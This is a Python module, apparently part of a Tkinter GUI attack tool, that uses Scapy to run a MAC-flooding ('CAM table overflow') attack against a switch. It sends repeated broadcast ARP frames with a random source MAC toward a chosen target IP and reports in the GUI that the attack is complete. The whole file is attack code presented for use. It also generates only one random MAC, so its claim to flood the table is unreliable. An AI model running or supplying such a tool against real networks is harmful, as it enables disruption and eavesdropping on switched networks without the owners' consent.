import threading
from scapy.all import *
from scapy.layers.l2 import Ether, ARP, sendp
from random import randint

from tkinter import *

def startCam(targetIp, packetNumber, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :

    global camIsRunning, camThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    camIsRunning = False
    camThreads = threading.Thread(target = lambda : camAttackHub(targetIp, packetNumber))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
    terminalLabel["text"] += "$ Amount of Packets to send = " + packetNumber + "\n"
    terminalLabel["text"] += "$ Running CAM Overflow Attack...\n"

    print("\nTarget IP = " + targetIp + "\n")

    runCamAttack()
    
    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def runCamAttack() :
    global camThreads, camIsRunning
    camIsRunning = True
    camThreads.start()

def camAttackHub(targetIp, packetNumber) :
    randomMac = get_random_mac()
    packet = create_packet(targetIp, randomMac)
    send_packet(packet, packetNumber)

# create a random MAC address function
def get_random_mac():
    return ":".join(["%02x" % randint(0, 255) for _ in range(6)])

# Create a packet with a fake MAC address
def create_packet(target_ip, randomMac):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=randomMac) / ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    return packet

# Send the packet multiple times to flood the switch's CAM table
def send_packet(packet, packetNumber):
    try :
        sendp(packet, inter=0.2, count=int(packetNumber))
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"

    terminalLabel["text"] += "\n All packets sent! \n"
    terminalLabel["text"] += "CAM Table Attack Completed \n\n"